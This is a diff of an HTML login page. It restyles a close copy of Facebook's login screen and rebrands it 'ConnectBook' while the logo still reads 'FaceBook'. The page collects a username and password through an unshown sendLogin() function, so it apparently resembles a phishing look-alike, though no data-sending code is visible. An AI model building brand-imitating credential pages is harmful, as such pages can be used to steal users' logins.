@@ -3,17 +3,17 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Facebook</title>
+  <title>ConnectBook</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: Helvetica, Arial, sans-serif;
+      font-family: "Segoe UI", Helvetica, Arial, sans-serif;
     }
 
     body {
-      background-color: #f0f2f5;
+      background: linear-gradient(180deg, #e8ebf2 0%, #f7f8fa 100%);
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -23,19 +23,21 @@
     }
 
     .logo {
-      color: #1877f2;
-      font-size: 55px;
-      font-weight: bold;
+      color: #2266dd;
+      font-size: 48px;
+      font-weight: 800;
+      letter-spacing: -1px;
       margin-bottom: 20px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.1);
     }
 
     .login-box {
-      background-color: #fff;
+      background-color: #ffffff;
       width: 90%;
       max-width: 380px;
-      padding: 15px 15px 20px 15px;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      padding: 25px 20px 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.12);
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -44,75 +46,84 @@
     .login-box input {
       width: 100%;
       padding: 14px;
-      margin: 6px 0;
-      font-size: 16px;
-      border: 1px solid #dddfe2;
-      border-radius: 8px;
-      background: #f5f6f7;
+      margin: 8px 0;
+      font-size: 15.5px;
+      border: 1px solid #cfd2d8;
+      border-radius: 10px;
+      background: #f7f8fa;
+      transition: 0.2s ease;
     }
 
     .login-box input:focus {
       outline: none;
-      border-color: #1877f2;
+      border-color: #2a6ef2;
       background: #fff;
+      box-shadow: 0 0 0 3px rgba(42,110,242,0.1);
     }
 
     .login-box button {
       width: 100%;
       padding: 14px;
-      background-color: #1877f2;
+      background-color: #2a6ef2;
       color: white;
       font-size: 17px;
       font-weight: bold;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 12px;
+      transition: background 0.3s ease;
     }
 
     .login-box button:hover {
-      background-color: #166fe5;
+      background-color: #1f5ed1;
     }
 
     .forgot {
-      color: #1877f2;
+      color: #2a6ef2;
       text-decoration: none;
       font-size: 14px;
-      margin: 12px 0;
+      margin: 14px 0;
+      font-weight: 500;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
     }
 
     .divider {
       width: 100%;
       border-bottom: 1px solid #dadde1;
-      margin: 10px 0 15px 0;
+      margin: 10px 0 18px 0;
     }
 
     .create-btn {
-      background-color: #42b72a;
+      background-color: #3cc93f;
       color: white;
-      font-weight: bold;
+      font-weight: 600;
       padding: 13px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       font-size: 16px;
       cursor: pointer;
       width: 70%;
+      transition: background 0.3s ease;
     }
 
     .create-btn:hover {
-      background-color: #36a420;
+      background-color: #34b437;
     }
 
     .footer {
-      margin-top: 40px;
+      margin-top: 50px;
       text-align: center;
       font-size: 12px;
-      color: #606770;
-      line-height: 1.5;
+      color: #666c75;
+      line-height: 1.6;
     }
 
     .footer a {
-      color: #606770;
+      color: #666c75;
       text-decoration: none;
       margin: 0 5px;
     }
@@ -123,21 +134,21 @@
   </style>
 </head>
 <body>
-  <div class="logo">facebook</div>
+  <div class="logo">FaceBook</div>
 
   <div class="login-box">
-    <input type="text" id="username" placeholder="Mobile number or email address">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="sendLogin()">Log in</button>
-    <a href="#" class="forgot">Forgotten password?</a>
+    <input type="text" id="username" placeholder="Email address or phone number">
+    <input type="password" id="password" placeholder="Enter your password">
+    <button onclick="sendLogin()">Sign in</button>
+    <a href="#" class="forgot">Forgot password?</a>
     <div class="divider"></div>
-    <button class="create-btn">Create new account</button>
+    <button class="create-btn">Create Account</button>
   </div>
 
   <div class="footer">
     <p>
-      English (UK) · বাংলা · हिन्दी · Español · العربية · Français (France)<br><br>
-      Meta © 2025
+      English (UK) · বাংলা · हिन्दी · Español · العربية · Français (FR)<br><br>
+      ConnectBook © 2025
     </p>
   </div>
 
